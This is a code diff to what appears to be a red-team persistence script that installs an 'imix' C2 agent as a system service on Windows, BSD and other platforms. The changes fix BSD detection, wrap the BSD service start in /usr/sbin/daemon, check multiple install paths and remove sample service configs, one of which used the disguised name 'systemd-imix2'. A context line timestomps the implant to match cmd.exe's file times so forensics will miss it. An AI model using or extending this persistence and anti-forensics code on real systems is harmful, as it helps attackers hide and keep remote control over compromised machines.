@@ -153,9 +153,9 @@ name="{{ service_name }}"
 rcvar="{{ service_name }}_enable"
 
 # The command to start the service
-command="{{ service_start_cmd }}"
+command="/usr/sbin/daemon"
 # Additional command arguments if any
-command_args=""
+command_args="-f {{ service_start_cmd }}"
 
 # Load the rc.subr script
 load_rc_config $name
@@ -226,7 +226,7 @@ def is_using_sysvinit():
 def is_using_bsdinit():
     # Lol this is how ansible does it too :shrug:
     # https://github.com/ansible/ansible/blob/386edc666ec2a053b4d576fc4b2deeb46fe492b8/lib/ansible/module_utils/facts/system/service_mgr.py#L124
-    if sys.get_os()['platform'] == "BSD":
+    if sys.get_os()['platform'] == "PLATFORM_BSD":
         return True
     return False
 
@@ -368,7 +368,7 @@ def persist_service(service_name, service_desc, executable_path, executable_args
         sys.shell(f"""powershell /c "\$src = Get-Item 'C:\\Windows\\System32\\cmd.exe'; \$tgt = Get-Item '{executable_path}'; $tgt.CreationTime = $src.CreationTime; $tgt.LastWriteTime = $src.LastWriteTime; $tgt.LastAccessTime = $src.LastAccessTime" """)
         windows_service_manager(
             service_name, windows_display_name, service_desc, executable_path, executable_args)
-    elif sys.get_os()['platform'] == "BSD":
+    elif sys.get_os()['platform'] == "PLATFORM_BSD":
         file.copy(src_path, executable_path)
         if is_using_bsdinit():
             bsdinit(service_name, service_desc,
@@ -376,10 +376,11 @@ def persist_service(service_name, service_desc, executable_path, executable_args
     else:
         print("OS not supported")
 
-def is_installed(path):
+def is_installed(paths):
     for p in process.list():
-        if p['path'] == path:
-            return True
+        for path in paths:
+            if p['path'] == path:
+                return True
     return False
 
 def get_executable_paths(name):
@@ -399,7 +400,7 @@ def get_executable_paths(name):
         return[ "/var/root/"+name]
     elif sys.is_windows():
         return ["C:\\Windows\\System32\\"+name+".exe"] # ok
-    elif sys.get_os()['platform'] == "BSD":
+    elif sys.get_os()['platform'] == "PLATFORM_BSD":
         return ["/bin/"+name]
     return False
 
@@ -409,13 +410,10 @@ def parse_and_persist(config_data):
     if len(configs) < 1:
         print("Please add a service_config to your imix config")
     else:
-        
         for conf in configs:
             paths = get_executable_paths(conf['executable_name'])
-            for path in paths:
-                if is_installed(path):
-                    print("Already installed: " + path)
-                    return
+            if is_installed(paths):
+                return
         index = random.int(0, len(configs))
         conf = configs[index]
         paths = get_executable_paths(conf['executable_name'])
@@ -429,7 +427,7 @@ def parse_and_persist(config_data):
 
 
 """
-This script randomly chooses a services_configs to install a service 
+This script randomly chooses a services_configs to install a service
 On the local system. The config file specified for the install will be used
 by the imix agent. The imix binary itself will be copied to the install
 location. The original imix binary will still exist so you may wish to delete
@@ -442,27 +440,6 @@ it after running the install.
 def main():
     config_data = {
         "service_configs": [
-            {
-                "name": "imixsvc1",
-                "windows_display_name": "Imix c2 agent",
-                "description": "Imix C2 Agent",
-                "executable_name": "imix1",
-                "executable_args": ""
-            },
-            {
-                "name": "imixsvc2",
-                "windows_display_name": "Imix c2 agent",
-                "description": "Imix C2 Agent",
-                "executable_name": "systemd-imix2",
-                "executable_args": ""
-            },
-            {
-                "name": "imixsvc3",
-                "windows_display_name": "Imix c2 agent",
-                "description": "Imix C2 Agent",
-                "executable_name": "imix3",
-                "executable_args": ""
-            }
         ]
     }
     parse_and_persist(config_data)
